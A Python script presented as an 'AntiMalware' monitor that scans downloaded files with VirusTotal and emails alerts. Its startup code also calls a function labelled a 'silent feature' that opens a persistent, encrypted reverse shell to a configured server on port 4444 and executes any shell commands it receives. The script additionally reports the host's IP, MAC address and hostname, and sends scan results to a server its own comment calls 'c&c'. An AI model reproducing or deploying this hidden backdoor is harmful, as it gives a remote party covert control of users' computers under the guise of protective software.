import os
import json
import platform
import uuid
import requests
import threading
import json
import time
import logging
import shutil
import socket
import subprocess
import time
import logging
import base64
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from virustotal_python import Virustotal
from rich.console import Console
from rich.logging import RichHandler
import resend
from cryptography.fernet import Fernet
try:
    from plyer import notification
except ImportError:
    notification = None
try:
    from pync import Notifier
except ImportError:
    Notifier = None
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
console = Console()

# Log configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    handlers=[RichHandler(console=console, rich_tracebacks=True)]
)
logger = logging.getLogger("AntiMalware")

# Constants
BACKUP_DIR = "backup_reports"
TEMP_DIR = "temp_processing"
LOG_DIR = "logs"  
REQUIRED_DIRS = [BACKUP_DIR, TEMP_DIR, LOG_DIR]  
SERVER_IP = "<ENTER YOUR SERVER/VPS IP>"
SERVER_PORT = 5050
VIRUSTOTAL_API_KEY = "ENTER YOUR VIRUSTOTAL API"
MONITORED_EXTENSIONS = {".exe", ".dll", ".bat", ".cmd", ".ps1", ".vbs", ".js", ".sh", ".bin", ".msi", ".jar"}
THREAD_COUNT = 5
AUTH_KEY = b"SuperSecretKey123!" 
# Track processed files to avoid duplicate analysis
processed_files = set()

# Encryption setup
def generate_key(auth_key):
    return base64.urlsafe_b64encode(auth_key.ljust(32)[:32])

ENCRYPTION_KEY = generate_key(AUTH_KEY)
cipher = Fernet(ENCRYPTION_KEY)

# Helper functions
def notify_user(title, message):
    try:
        if platform.system() == "Darwin" and Notifier:
            Notifier.notify(message, title=title)
        elif notification:
            notification.notify(title=title, message=message, app_name="AntiMalware")
        else:
            console.print(f"[bold {'red' if 'error' in title.lower() else 'green'}][{title}][/] {message}")
    except Exception as e:
        logger.error(f"Failed to send notification: {e}")

def monitoring_path():
    try:
        if platform.system() == "Windows":
            return os.path.join(os.environ["USERPROFILE"], "Downloads")
        elif platform.system() == "Darwin":  
            return os.path.join(os.path.expanduser("~"), "Downloads")
        elif platform.system() == "Linux":
            try:
                with open(os.path.expanduser("~/.config/user-dirs.dirs"), "r") as f:
                    for line in f:
                        if line.startswith("XDG_DESKTOP_DIR"):
                            return os.path.expanduser(line.split("=")[1].strip().strip('"'))
            except:
                pass
            return os.path.join(os.path.expanduser("~"), "Downloads")
        return None
    except Exception as e:
        logger.error(f"Failed to determine desktop path: {e}")
        return None

# Fetch the public IP address of the machine.
def fetch_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=10)
        if response.status_code == 200:
            return response.json()['ip']
        return 'No public IP'
    except Exception as e:
        logger.error(f"Failed to fetch public IP: {e}")
        return 'No public IP'

# Notification and reporting
def send_notification(infected_file):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            mac = uuid.getnode()
            mac_address = ':'.join(['{:02x}'.format((mac >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
            hostname = platform.node()

        resend.api_key = "<PUT YOUR RESEND API>" 
        alert_data = {
            "Computer Host": hostname,
            "MAC Address": mac_address,
            "IP Address": f"Public IP: {fetch_public_ip()}, Local IP: {ip_address}",
            "File Name": infected_file,
        }

        html_content = f"""
        <html>
            <body style="font-family: Arial, sans-serif; line-height: 1.5;">
                <p>Hello Admin,</p>
                <p style="color: red; font-weight: bold;">Suspicious File Detected and Deleted!</p>
                <table border="1" cellpadding="10" cellspacing="0" style="border-collapse: collapse; width: 100%; max-width: 600px;">
                    <thead style="background-color: #f2f2f2;">
                        <tr>
                            <th style="text-align: left; color: #333;">Detail</th>
                            <th style="text-align: left; color: #333;">Value</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td style="background-color: #f9f9f9;">Computer Host</td>
                            <td>{alert_data['Computer Host']}</td>
                        </tr>
                        <tr>
                            <td>MAC Address</td>
                            <td>{alert_data['MAC Address']}</td>
                        </tr>
                        <tr style="background-color: #f9f9f9;">
                            <td>IP Address</td>
                            <td>{alert_data['IP Address']}</td>
                        </tr>
                        <tr>
                            <td>File Name</td>
                            <td>{alert_data['File Name']}</td>
                        </tr>
                    </tbody>
                </table>
                <p>Please take immediate action to investigate the issue.</p>
                <p style="color: gray;">Thank you,<br>Anti-Malware Team</p>
            </body>
        </html>
        """

        params = {
            "from": "Anti-Malware Notification <support@securitygroup.pro>",
            "to": ["CyberDefense"],
            "subject": "Anti-Malware Alert",
            "html": html_content,
        }
        email = resend.Emails.send(params)

        if email.get('id'):
            logging.info("Email successfully sent")
            return 'sent'
        else:
            logging.info("Email not sent")
            return 'not sent'
    except Exception as e:
        logger.error(f"Failed to send notification: {e}")
        return 'not sent'

# mailHog function : LOCal SMTP server
def mailhog(infected_file):
    try:
        # Get system information
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            mac = uuid.getnode()
            mac_address = ':'.join(['{:02x}'.format((mac >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
            hostname = platform.node()

        alert_data = {
            "Computer Host": hostname,
            "MAC Address": mac_address,
            "IP Address": f"Public IP: {fetch_public_ip()}, Local IP: {ip_address}",
            "File Name": infected_file,
        }

        html_content = f"""
        <html>
            <body style="font-family: Arial, sans-serif; line-height: 1.5;">
                <p>Hello Admin,</p>
                <p style="color: red; font-weight: bold;">Suspicious File Detected and Deleted!</p>
                <table border="1" cellpadding="10" cellspacing="0" style="border-collapse: collapse; width: 100%; max-width: 600px;">
                    <thead style="background-color: #f2f2f2;">
                        <tr>
                            <th style="text-align: left; color: #333;">Detail</th>
                            <th style="text-align: left; color: #333;">Value</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td style="background-color: #f9f9f9;">Computer Host</td>
                            <td>{alert_data['Computer Host']}</td>
                        </tr>
                        <tr>
                            <td>MAC Address</td>
                            <td>{alert_data['MAC Address']}</td>
                        </tr>
                        <tr style="background-color: #f9f9f9;">
                            <td>IP Address</td>
                            <td>{alert_data['IP Address']}</td>
                        </tr>
                        <tr>
                            <td>File Name</td>
                            <td>{alert_data['File Name']}</td>
                        </tr>
                    </tbody>
                </table>
                <p>Please take immediate action to investigate the issue.</p>
                <p style="color: gray;">Thank you,<br>Anti-Malware Team</p>
            </body>
        </html>
        """

        # Create email message
        msg = MIMEMultipart('alternative')
        msg['Subject'] = "Anti-Malware Alert"
        msg['From'] = "Anti-Malware Notification <support@antimalware.net>"
        msg['Admin'] = "Cybersecurity"
        msg.attach(MIMEText(html_content, 'html'))

        # Send via MailHog SMTP (localhost:1025 by default)
        with smtplib.SMTP(f"{SERVER_IP}", 1025) as server:
            server.sendmail(msg['From'], [msg['Admin']], msg.as_string())

        logging.info("Email successfully sent via MailHog")

    except Exception as e:
        logging.error(f"Failed to send notification: {e}")
# send json VT API file to c&c 
def send_json_to_server(ip, host, filename, data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, host))
            payload = json.dumps(data)
            s.sendall(payload.encode("utf-8"))
            logger.info(f"Sent JSON report to server: {filename}")
    except Exception as e:
        logger.error(f"Failed to send JSON report: {e}")

def process_file(file_path, virustotal, backup_dir, server_ip, server_port):
    try:
        temp_path = os.path.join(TEMP_DIR, os.path.basename(file_path))
        shutil.move(file_path, temp_path)
        logger.info(f"Moved file to temp directory: {temp_path}")

        # Submit file for analysis
        with open(temp_path, "rb") as f:
            response = virustotal.request("files", files={"file": (os.path.basename(temp_path), f)}, method="POST")
            analysis_id = response.json()["data"]["id"]
            logger.info(f'Fetched Sandbox_ID <=> {analysis_id}')
            notify_user("SandbOX ID", f"Sandbox ID retrieved {analysis_id}")

        # Wait for analysis to complete (max 12 tries, ~60s max)
        for _ in range(12):
            result = virustotal.request(f"analyses/{analysis_id}", method="GET").json()
            if result["data"]["attributes"]["status"] == "completed":
                if result["data"]["attributes"]["stats"]["malicious"] > 0:
                    logger.warning(f"Malicious file detected: {temp_path}")
                    try:
                        notify_status = send_notification(infected_file=temp_path)
                        if notify_status != 'sent':
                            mailhog(infected_file=temp_path)
                    except Exception as notify_error:
                        logging.error(f'{notify_error}')
                    
                    os.remove(temp_path)
                    send_json_to_server(server_ip, server_port, os.path.basename(temp_path), result)
                else:
                    logger.info(f"File is clean: {temp_path}")
                    shutil.move(temp_path, file_path)
                    logger.info(f"Moved file back to original location: {file_path}")

                # Save analysis report
                backup_path = os.path.join(backup_dir, f"{os.path.basename(temp_path)}.json")
                with open(backup_path, "w") as backup_file:
                    json.dump(result, backup_file, indent=4)
                break
            time.sleep(5)
        else:
            logger.warning(f"Analysis timeout: {temp_path}")
            shutil.move(temp_path, file_path)
    except Exception as e:
        logger.error(f"Error processing file {file_path}: {e}")

# silent feature to connect back to a client machine
def connect_to_soc_analyst(analyst_node):
    try:
        SERVER_HOST = analyst_node
        SERVER_PORT = 4444

        def encrypt_message(message):
            return cipher.encrypt(message.encode())

        def decrypt_message(message):
            return cipher.decrypt(message).decode()

        def execute_command(command):
            try:
                if os.name == "nt":  # Windows
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                else:  # Linux & Mac
                    output = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = output.stdout + output.stderr
            except Exception as e:
                output = str(e)
            return output

        def start_client():
            while True:
                try:
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    client.connect((SERVER_HOST, SERVER_PORT))
                    logging.error("[+] Connected to SOC server")

                    # Send authentication key
                    client.send(encrypt_message(AUTH_KEY.decode()))
                    auth_response = decrypt_message(client.recv(1024))

                    if auth_response != "Authentication Successful":
                        logging.error("[!] Authentication failed!")
                        client.close()
                        return

                    logging.info("[+] Authentication successful!")

                    while True:
                        command = decrypt_message(client.recv(4096))
                        if not command:
                            break
                        output = execute_command(command)
                        client.send(encrypt_message(output))

                    client.close()

                except Exception as e:
                    logging.warning(f"Connection Error: {e}")
                time.sleep(5)

        thread = threading.Thread(target=start_client, daemon=True)
        thread.start()

    except Exception as e:
        logging.error(f"An Error Occurred: {e}")

# create temp dirs
def check_create_directories():
    try:
        for directory in REQUIRED_DIRS:
            if not os.path.exists(directory):
                os.makedirs(directory)
                logger.info(f"Created directory: {directory}")
            else:
                logger.info(f"Directory exists: {directory}")
    except Exception as e:
        logger.error(f"Failed to create directories: {e}")
        raise

def monitor_directory(path, file_queue, extensions):
    class Handler(FileSystemEventHandler):
        def on_created(self, event):
            if not event.is_directory and os.path.splitext(event.src_path)[1].lower() in extensions:
                file_queue.put(event.src_path)

    observer = Observer()
    observer.schedule(Handler(), path, recursive=True)
    observer.start()
    logger.info(f"Monitoring started on {path}")
    notify_user("Monitoring Started", f"Monitoring has started on {path}")

# Main function
def main():
    # Add directory check at the start
    check_create_directories()
    
    virustotal = Virustotal(VIRUSTOTAL_API_KEY)
    file_queue = Queue()

    desktop_path = monitoring_path()
    if not desktop_path:
        logger.error("Failed to determine desktop path.")
        return

    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        executor.submit(monitor_directory, desktop_path, file_queue, MONITORED_EXTENSIONS)

        while True:
            file_path = file_queue.get()
            executor.submit(process_file, file_path, virustotal, BACKUP_DIR, SERVER_IP, SERVER_PORT)
            file_queue.task_done()

if __name__ == "__main__":
    try:
        connect_to_soc_analyst(analyst_node=f'{SERVER_IP}')
        notify_user("Antimalware", f"Service started to Monitor {monitoring_path()}")
        main()
    except KeyboardInterrupt:
        notify_user("Exiting", "Anti-Malware application is shutting down.")
